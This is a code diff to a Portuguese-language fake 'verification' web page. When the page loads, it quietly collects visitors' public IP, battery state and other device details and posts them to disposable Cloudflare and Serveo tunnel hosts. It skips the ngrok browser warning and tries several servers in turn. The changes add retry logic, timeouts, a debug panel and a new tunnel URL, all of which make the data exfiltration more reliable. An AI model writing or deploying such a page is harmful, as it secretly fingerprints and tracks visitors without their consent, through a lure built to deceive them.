@@ -25,7 +25,7 @@
             background: white;
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            max-width: 450px;
+            max-width: 500px;
             width: 100%;
             overflow: hidden;
             position: relative;
@@ -260,6 +260,39 @@
             font-size: 14px;
             margin-top: 15px;
             display: none;
+            background: #f8d7da;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .debug-info {
+            font-size: 12px;
+            color: #6c757d;
+            margin-top: 20px;
+            text-align: left;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .debug-toggle {
+            color: #007bff;
+            cursor: pointer;
+            font-size: 12px;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        .retry-button {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -309,6 +342,15 @@
                 <div class="error-message" id="errorMessage">
                     Erro ao conectar com o servidor. Verificando alternativas...
                 </div>
+
+                <div class="debug-info" id="debugInfo">
+                    <strong>Informações de Debug:</strong>
+                    <div id="debugContent"></div>
+                </div>
+
+                <div class="debug-toggle" id="debugToggle" onclick="toggleDebug()">
+                    Mostrar informações técnicas
+                </div>
                 
                 <div class="session-info">
                     Sessão: <span id="sessionId"></span>
@@ -333,6 +375,10 @@
                     Sessão: <span id="finalSessionId"></span> | 
                     Status: <span id="serverStatus">Dados enviados com sucesso</span>
                 </div>
+
+                <button class="retry-button" id="retryButton" style="display: none;">
+                    Tentar enviar dados novamente
+                </button>
             </div>
         </div>
     </div>
@@ -340,7 +386,7 @@
     <script>
         // *** CONFIGURAÇÃO CRUCIAL: URLs dos servidores ***
         const SERVER_URLS = [
-            'https://terry-chem-belize-attitudes.trycloudflare.com',
+            'https://scheduling-aye-songs-organised.trycloudflare.com',
             'https://socialdivulga.serveo.net',
             'http://127.0.0.1:8000'  // Localhost para testes
         ];   
@@ -357,6 +403,8 @@
         let currentStep = 0;
         let currentServerIndex = 0;
         let dataSentSuccessfully = false;
+        let collectedData = {};
+        let debugInfo = [];
         
         // Obter o IP público usando uma API externa
         async function getPublicIP() {
@@ -372,33 +420,54 @@
         
         // Função para fazer requisições com headers personalizados
         async function customFetch(endpoint, data) {
+            debugInfo.push(`Tentando enviar dados para o servidor...`);
+            updateDebugInfo();
+            
             // Tentar cada servidor até encontrar um que funcione
             for (let i = 0; i < SERVER_URLS.length; i++) {
                 const serverUrl = SERVER_URLS[i];
+                debugInfo.push(`Tentando servidor ${i+1}: ${serverUrl}`);
+                updateDebugInfo();
+                
                 try {
+                    // Usar AbortController para timeout
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos de timeout
+                    
                     const response = await fetch(serverUrl + endpoint, {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json",
                             "ngrok-skip-browser-warning": "true"
                         },
-                        body: JSON.stringify(data)
+                        body: JSON.stringify(data),
+                        signal: controller.signal
                     });
                     
+                    clearTimeout(timeoutId);
+                    
                     if (response.ok) {
-                        console.log(`Dados enviados com sucesso para ${serverUrl}`);
+                        debugInfo.push(`✅ Dados enviados com sucesso para ${serverUrl}`);
+                        updateDebugInfo();
                         currentServerIndex = i; // Usar este servidor para próximas requisições
                         return true;
                     } else {
-                        console.error(`Erro do servidor ${serverUrl}:`, response.status);
+                        debugInfo.push(`❌ Erro do servidor ${serverUrl}: ${response.status}`);
+                        updateDebugInfo();
                     }
                 } catch (error) {
-                    console.error(`Erro ao conectar com ${serverUrl}:`, error);
+                    if (error.name === 'AbortError') {
+                        debugInfo.push(`⏰ Timeout ao conectar com ${serverUrl}`);
+                    } else {
+                        debugInfo.push(`❌ Erro ao conectar com ${serverUrl}: ${error.message}`);
+                    }
+                    updateDebugInfo();
                 }
             }
             
             // Se nenhum servidor respondeu, mostrar mensagem de erro
             document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('retryButton').style.display = 'inline-block';
             return false;
         }
 
@@ -407,7 +476,7 @@
             try {
                 const publicIP = await getPublicIP();
                 
-                const deviceInfo = {
+                collectedData = {
                     session_id: sessionId,
                     timestamp: new Date().toISOString(),
                     ip_address: publicIP,
@@ -482,7 +551,7 @@
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
-                        deviceInfo.battery = {
+                        collectedData.battery = {
                             charging: battery.charging,
                             level: battery.level * 100,
                             chargingTime: battery.chargingTime,
@@ -494,11 +563,14 @@
                 }
 
                 // Enviar dados para o servidor
-                dataSentSuccessfully = await customFetch("/device_info", deviceInfo);
+                dataSentSuccessfully = await customFetch("/device_info", collectedData);
                 
                 if (!dataSentSuccessfully) {
                     document.getElementById('serverStatus').textContent = "Falha no envio dos dados";
                     document.getElementById('serverStatus').style.color = "#dc3545";
+                } else {
+                    document.getElementById('serverStatus').textContent = "Dados enviados com sucesso";
+                    document.getElementById('serverStatus').style.color = "#28a745";
                 }
                 
             } catch (error) {
@@ -506,6 +578,26 @@
                 dataSentSuccessfully = false;
                 document.getElementById('serverStatus').textContent = "Erro na coleta de dados";
                 document.getElementById('serverStatus').style.color = "#dc3545";
+                debugInfo.push(`❌ Erro na coleta de dados: ${error.message}`);
+                updateDebugInfo();
+            }
+        }
+
+        function updateDebugInfo() {
+            const debugContent = document.getElementById('debugContent');
+            debugContent.innerHTML = debugInfo.map(item => `<div>${item}</div>`).join('');
+        }
+
+        function toggleDebug() {
+            const debugInfo = document.getElementById('debugInfo');
+            const debugToggle = document.getElementById('debugToggle');
+            
+            if (debugInfo.style.display === 'none') {
+                debugInfo.style.display = 'block';
+                debugToggle.textContent = 'Ocultar informações técnicas';
+            } else {
+                debugInfo.style.display = 'none';
+                debugToggle.textContent = 'Mostrar informações técnicas';
             }
         }
 
@@ -604,13 +696,20 @@
             // window.location.href = '/main';
         }
         
+        function retrySendData() {
+            document.getElementById('retryButton').style.display = 'none';
+            document.getElementById('serverStatus').textContent = "Tentando enviar dados novamente...";
+            collectDeviceInfo();
+        }
+        
         // Iniciar automaticamente quando a página carrega
         window.addEventListener('load', function() {
             startVerification();
         });
         
-        // Adicionar event listener para o botão de continuar
+        // Adicionar event listeners
         document.getElementById('continueButton').addEventListener('click', redirectToApp);
+        document.getElementById('retryButton').addEventListener('click', retrySendData);
     </script>
 </body>
 </html>
